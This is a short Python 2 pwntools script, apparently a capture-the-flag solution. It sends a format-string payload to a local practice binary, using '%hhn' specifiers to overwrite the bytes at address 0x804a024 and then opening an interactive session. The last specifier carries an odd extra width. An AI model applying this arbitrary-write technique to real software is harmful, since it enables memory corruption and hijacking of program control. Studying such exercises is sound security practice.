from pwn import *
p=process("./3-20");

x=0x804a024;
p.sendline(p32(x)+p32(x+1)+p32(x+2)+p32(x+3)+"%223c%7$hhn"+"%207c%8$hhn"+"%239c%9$hhn"+"%49c%10$10hhn")
print p.recv();
raw_input("Y")
p.interactive();
